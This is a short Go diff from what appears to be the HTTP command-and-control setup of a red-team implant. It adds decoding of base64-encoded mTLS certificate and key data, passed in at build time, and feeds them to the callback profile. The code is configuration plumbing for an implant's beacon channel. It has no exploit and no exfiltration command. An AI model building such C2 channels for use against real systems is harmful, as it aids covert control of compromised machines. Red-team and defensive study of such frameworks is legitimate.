@@ -253,6 +253,19 @@ func initHTTPC2(cfg parsedConfig) (*c2Setup, error) {
 		}
 	}
 
+	// Decode mTLS PEM data from base64 (ldflags can't carry raw PEM newlines)
+	decodedCert, decodedKey := "", ""
+	if mtlsCertPEM != "" {
+		if decoded, err := base64.StdEncoding.DecodeString(mtlsCertPEM); err == nil {
+			decodedCert = string(decoded)
+		}
+	}
+	if mtlsKeyPEM != "" {
+		if decoded, err := base64.StdEncoding.DecodeString(mtlsKeyPEM); err == nil {
+			decodedKey = string(decoded)
+		}
+	}
+
 	httpProfile := http.NewHTTPProfile(
 		callbackURL,
 		userAgent,
@@ -269,6 +282,8 @@ func initHTTPC2(cfg parsedConfig) (*c2Setup, error) {
 		proxyPass,
 		tlsVerify,
 		tlsFingerprint,
+		decodedCert,
+		decodedKey,
 		fallbackURLs,
 		ctList,
 		cfg.recoverySeconds,
